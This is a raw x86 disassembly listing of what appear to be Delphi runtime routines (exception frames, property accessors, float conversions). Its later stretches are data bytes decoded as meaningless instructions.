mov [ fs : eax ] edx
push sub_417c4f
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_417c58
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_417ab8
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_417b28
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_417ba8
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404120
pop ebx
retn
sub_417c98
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_417ae0
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_417b68
pop ebx
retn
dec bl
je r-xdata
call sub_417c00
jmp r-xdata
pop ebx
retn
sub_417cc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_417d9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_417c58
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404978
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417da3
lea eax [ ebp - 0x10 ]
call sub_404120
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404868
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40482c
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_417dac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_417e72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4043a8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_417c98
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e79
lea eax [ ebp - 0xc ]
call sub_404120
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404868
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_417e80
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173c8
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_417ec0 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173c8
cmp [ eax ] 0x4
jne r-xdata
sub_417f98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4173c8
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_417fe0 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41810f ]
jmp [ eax * 4 + jump_table_41807c ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4181a4
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_418190
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4181e4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_418190
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_418224
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_418264
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_41829c
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4182c4
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_418300
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_405b68
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_418380
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405b68
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4183f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41843a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418441
retn
mov eax rw-data
call sub_404120
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bd4
sub_4184f4
push cs
or al 0x74
popad
inc ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ ecx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ ecx ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov eax eax
sub [ ebp + 0xa0f0041 ] al
dec ecx
dec edi
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x11 ] si
inc eax
add [ ecx ] al
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
adc eax 0x8dffff00
inc eax
add [ ebp + eax * 4 + 0x41 ] bl
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
push edi
imul ebp [ esi + 0x64 ] 0x11a4776f
inc eax
add [ ecx ] al
adc al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
sub_418764
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_418789
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418790
retn
sub_418988
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov al [ ecx ]
or al 0x0
add [ eax ] al
loopne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 + 0xc0041 ] cl
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xb004033 ] al
inc ebp
inc esi
add [ eax + 0xc004033 ] al
inc ebp
push ebx
je r-xdata
add [ eax ] al
loopne r-xdata
inc eax
add [ edx + ecx * 4 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0xc0041 ] cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
test [ ecx + 0x35d80041 ] cl
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] dl
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd004033 ] al
inc ebp
inc esi
inc ebx
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00418b ] bl
add [ eax ] al
add ah dh
mov al [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
inc ebp
push edx
popad
inc ebp
jb r-xdata
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x75 ] al
inc ecx
add [ eax + eax ] cl
popad
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ edx + ecx * 4 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x74 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
mov eax [ ecx ]
or al 0x0
add [ eax ] al
hlt
outsd
jb r-xdata
dec edi
jo r-xdata
xor eax [ eax ]
or eax [ ebp + 0x46 ]
mov eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x35d80041 ] cl
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ ecx + edx + 0x408d0040 ] al
add al dl
mov [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ecx + 0xc0041 ] 0x1
add [ eax ] al
nop
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
lea eax [ eax ]
ror [ ecx + 0x41 ] 0x1
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
sub [ ebx ] dh
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xb004033 ] al
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx ] cl
mov eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov eax [ ecx ]
or al 0x0
outsd
jb r-xdata
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ eax + 0x10004033 ] al
shr al 0x8a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4190ad
mov [ eax - 0x6f68ffbf ] edx
inc ecx
add [ ecx + 0x1004190 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
lodsd [ esi ]
nop
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x6ed7ffc0 ] cl
inc ecx
add [ ecx + 0x4190 ] bh
add [ eax ] al
add [ eax ] bh
xchg ecx eax
inc ecx
add [ ecx + edx * 4 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6f ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
pop [ ecx ]
fdiv [ 0xffffffffbdf40040 ]
inc ecx
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi + edi * 4 + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
add al 0x0
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
in al dx
pop [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor eax 0x33280040
inc eax
imul esi [ ebx + 0x74 ] 0x64746e65
xchg ecx eax
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ ebx + esi + 0x40 ] al
add al ah
mov edi 0xbd340041
inc ecx
add [ edi * 4 - 0x43afffbf ] bh
inc ecx
add [ eax + eax * 8 + 0x41 ] cl
add [ ecx + eax * 8 ] ch
inc ecx
add [ ecx + eax * 8 + 0x41 ] bl
add [ ecx + eax * 8 + 0x41 ] dl
add [ eax + 0x20041bf ] ch
add bh bh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
dec esp
rol [ ecx ] 0x2c
rol [ ecx ] 0x5c
rol [ ecx ] 0x54
rol [ ecx ] 0xa8
mov edi 0x20041
imul esi [ ebx + 0x74 ] 0x28746e65
xchg ecx eax
inc ecx
add [ eax - 0x70 ] ah
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
xchg ecx eax
inc ecx
add [ edx ] cl
xchg edx eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_41924c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xf8004192
xchg edx eax
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
xchg edx eax
inc ecx
add al ch
xchg edx eax
inc ecx
add [ eax ] bl
add [ eax ] al
add ah ch
pop [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al bl
rol [ ecx ] 0x34
mov ebp 0xbd3c0041
inc ecx
add [ edx + eax * 8 + 0x41 ] al
add [ eax - 0x73ffbe3a ] cl
mov [ ecx ] 0x90
mov [ ecx ] 0x80
mov [ ecx ] 0x84
mov [ ecx ] 0xdc
retn 0x41
sub_419358
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + eax * 2 + 0x41944000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
xchg esp eax
inc ecx
add [ eax ] dl
add [ eax ] al
add ah ch
pop [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esi + eax * 8 - 0x42cbffbf ] dh
inc ecx
add ah ch
enter 0x41 0xe4
mov [ ecx ] r-xdata
jo r-xdata
inc ecx
add [ eax + 0x7800402b ] dl

sub_4193be
inc ecx
add al bh
rol [ ecx ] 0x1
sub al 0xd1
inc ecx
add [ edx + edx * 8 - 0x2ce3ffbf ] dl
inc ecx
add ah bl
rol [ ecx ] cl
adc ch dl
inc ecx
add ah ah
mov [ ecx ] 0x8
mov [ ecx ] sub_41c72c
nop
sub eax [ eax ]
nop
sub eax [ eax ]
mov dl cl
inc ecx
add [ ebx + ecx * 8 + 0x41 ] bh
add [ ebp + ecx * 8 - 0x31efffbf ] al
inc ecx
add ah ah
into
inc ecx
add [ eax + 0x1800402b ] dl
iretd
sub_419464
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
in al dx
outsb
dec ecx
je r-xdata
enter 0x41 0xe4
mov [ ecx ] sub_41d7f8
sub al 0xd8
inc ecx
add [ eax ] dh
fadd [ ecx ]
xor al 0xd8
inc ecx
add al dl

insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
sub_419488
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
xchg ebx eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6b ] ch
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ebx + edx * 4 + 0x41 ] dl
add al bl
xor eax 0x35e40040
outsb
jae r-xdata
sbb al 0xd3
inc ecx
add ah bl
rol [ ecx ] cl
adc ch dl
inc ecx
add ah ah
mov [ ecx ] 0x8
mov [ ecx ] sub_41c72c
nop
sub eax [ eax ]
nop
sub eax [ eax ]
mov dl cl
inc ecx
add [ ebx + ecx * 8 + 0x41 ] bh
add [ ebp + ecx * 8 - 0x31efffbf ] al
inc ecx
add ah ah
into
inc ecx
add [ eax + 0x1800402b ] dl
iretd
inc eax
xchg esp eax
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2b ] dl
inc ecx
fdiv [ 0x35e40040 ]
outsb
jae r-xdata
add [ eax + 0x7c0041ca ] cl

xchg ebx eax
inc ecx
add [ eax - 0x70 ] ah
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ edi * 4 - 0x3713ffbf ] dh
inc ecx
add ah ah
aad 0x41
jae r-xdata
add [ ebx + 0x419464c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
mov [ ecx ] sub_41d7f8
sub al 0xd8
inc ecx
add [ eax ] dh
fadd [ ecx ]
xor al 0xd8
inc ecx
add al dl

in al dx
outsb
dec ecx
je r-xdata
enter 0x41 0xe4
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
sub_4196e9
fild [ ecx ]
or edx [ esi + eax * 2 + 0x69 ]
insb
push ebx
je r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
inc esp
xchg edi eax
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x69 ] ah
inc ecx
add [ eax ] dl
add [ eax ] al
add [ ebp + edx * 4 + 0x35d80041 ] bl
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add al bl
fild [ ecx ]
and al 0xdc
inc ecx
add [ esp + ebx * 8 ] bh
inc ecx
add [ edx ] ch
inc ecx
add [ eax + 0x6400402b ] dl
loop r-xdata
jns r-xdata
push ebx
je r-xdata
clc
xchg esi eax
